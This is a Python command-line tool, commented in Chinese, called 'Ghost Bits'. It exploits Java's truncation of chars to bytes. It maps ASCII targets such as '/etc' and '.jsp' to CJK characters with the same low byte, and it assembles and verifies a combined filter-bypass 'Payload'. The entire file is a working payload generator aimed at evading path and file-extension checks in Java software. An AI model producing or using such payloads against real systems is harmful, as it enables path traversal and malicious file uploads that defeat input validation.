import argparse
import sys

def unicode_to_low_bytes(text: str) -> bytes:
    """功能1：将Unicode字符串每个字符截取低8位，转为byte序列
    对应Java中 (byte)ch / ch & 0xff 的行为，高位被静默丢弃
    """
    low_bytes = bytes([ord(ch) & 0xff for ch in text])
    return low_bytes

def generate_unicode_by_low_byte(target_byte: int, count: int = 1) -> list:
    """功能2：根据目标低字节，生成低字节相同的可见Unicode字符
    可见字符优先选择CJK统一汉字区（U+4E00~U+9FFF）的字符，避免控制字符
    """
    if not 0x00 <= target_byte <= 0xff:
        raise ValueError("目标字节必须介于 0x00~0xFF 之间")
    
    result = []
    # 从CJK统一汉字区起始位置开始遍历，寻找低8位匹配且为可见字符的Unicode
    for high_bits in range(0x0100, 0xFFFF + 1, 0x100):
        char_code = high_bits | target_byte
        # 过滤CJK统一汉字区（U+4E00~U+9FFF）的可见字符，避免控制字符/私有区
        if 0x4E00 <= char_code <= 0x9FFF:
            ch = chr(char_code)
            # 排除不可见/特殊字符
            if ch.isprintable() and not ch.isspace():
                result.append(ch)
                if len(result) >= count:
                    break
    return result

def generate_unicode_by_string(target_str: str, count_per_byte: int = 1) -> dict:
    """新增功能：传入ASCII字符串，拆分每个字符的字节值，批量生成对应Unicode字符
    target_str: 目标ASCII字符串，比如"/etc"、".jsp"等
    count_per_byte: 每个字节生成多少个字符，默认1个
    """
    result = {}
    for ch in target_str:
        byte_val = ord(ch)
        if not 0x20 <= byte_val <= 0x7E:
            print(f"警告：字符 {repr(ch)} 不是可打印ASCII字符，跳过")
            continue
        try:
            chars = generate_unicode_by_low_byte(byte_val, count_per_byte)
            result[ch] = {
                "byte_hex": f"0x{byte_val:02X}",
                "chars": chars
            }
        except ValueError as e:
            print(f"处理字符 {repr(ch)} 时出错：{e}")
    return result

def main():
    parser = argparse.ArgumentParser(
        description="Ghost Bits (幽灵比特位) 工具：基于Java char转byte高位丢失特性实现功能",
        epilog="示例：\n"
               "  1. 低字节转换：python ghost_bits_tool.py --mode lowbytes --input '陪sp'\n"
               "  2. 生成单字节Unicode：python ghost_bits_tool.py --mode genunicode --byte 0x2F --count 3\n"
               "  3. 字符串批量生成Unicode：python ghost_bits_tool.py --mode genbystr --string '/etc' --count 2"
    )
    parser.add_argument("--mode", required=True, choices=["lowbytes", "genunicode", "genbystr"],
                        help="运行模式：lowbytes=Unicode转低字节，genunicode=单字节生成Unicode，genbystr=ASCII字符串批量生成Unicode")
    parser.add_argument("--input", type=str, default=None,
                        help="lowbytes模式下的输入Unicode字符串")
    parser.add_argument("--byte", type=lambda x: int(x, 0), default=None,
                        help="genunicode模式下的目标低字节，支持十六进制（如0x6A）或十进制")
    parser.add_argument("--count", type=int, default=1,
                        help="genunicode/genbystr模式下每个字节生成的字符数量，默认1")
    parser.add_argument("--string", type=str, default=None,
                        help="genbystr模式下的目标ASCII字符串，比如'/etc'、'.jsp'等")
    
    args = parser.parse_args()

    if args.mode == "lowbytes":
        if not args.input:
            # 交互式获取输入
            print("请输入需要转换的Unicode字符串（输入空行结束）：")
            lines = []
            while True:
                line = sys.stdin.readline()
                if not line.strip():
                    break
                lines.append(line.rstrip('\n'))
            input_text = '\n'.join(lines)
        else:
            input_text = args.input
        
        low_bytes = unicode_to_low_bytes(input_text)
        print("\n===== 转换结果 =====")
        print(f"原始Unicode字符串：{repr(input_text)}")
        print(f"低字节十六进制序列：{low_bytes.hex(' ')}")
        print(f"低字节ASCII显示：{low_bytes.decode('ascii', errors='replace')}")
        for ch in input_text:
            print(f"  字符 {repr(ch)} (U+{ord(ch):04X}) -> 低8位 0x{ord(ch)&0xff:02X} ({chr(ord(ch)&0xff)})")

    elif args.mode == "genunicode":
        if args.byte is None:
            print("错误：genunicode模式必须指定 --byte 参数")
            sys.exit(1)
        try:
            chars = generate_unicode_by_low_byte(args.byte, args.count)
            print("\n===== 生成结果 =====")
            print(f"目标低字节：0x{args.byte:02X} ({chr(args.byte) if 0x20<=args.byte<=0x7E else '不可见'})")
            print(f"生成的Unicode字符（低字节相同）：")
            if chars:
                for i, ch in enumerate(chars, 1):
                    print(f"  {i}. {repr(ch)} (U+{ord(ch):04X})，低8位 0x{ord(ch)&0xff:02X} -> {chr(ord(ch)&0xff)}")
            else:
                print("  未找到符合条件的可见Unicode字符")
        except ValueError as e:
            print(f"错误：{e}")
            sys.exit(1)

    elif args.mode == "genbystr":
        if not args.string:
            print("错误：genbystr模式必须指定 --string 参数")
            sys.exit(1)
        result = generate_unicode_by_string(args.string, args.count)
        print("\n===== 批量生成结果 =====")
        print(f"目标字符串：{repr(args.string)}")
        for origin_ch, info in result.items():
            print(f"\n原始字符：{repr(origin_ch)} (ASCII 0x{ord(origin_ch):02X})")
            print(f"生成的Unicode字符（共{len(info['chars'])}个）：")
            for i, ch in enumerate(info["chars"], 1):
                print(f"  {i}. {repr(ch)} (U+{ord(ch):04X})，低8位 0x{ord(ch)&0xff:02X} -> {chr(ord(ch)&0xff)}")
        # 组合示例：把生成的字符拼成完整Payload
        if result:
            print("\n===== 组合Payload示例（每个字节取第1个生成的字符） =====")
            payload = ''.join([info["chars"][0] for info in result.values()])
            print(f"Payload：{repr(payload)}")
            low_bytes = unicode_to_low_bytes(payload)
            print(f"验证低字节：{low_bytes.hex(' ')}，对应ASCII：{low_bytes.decode('ascii', errors='replace')}")

if __name__ == "__main__":
    main()
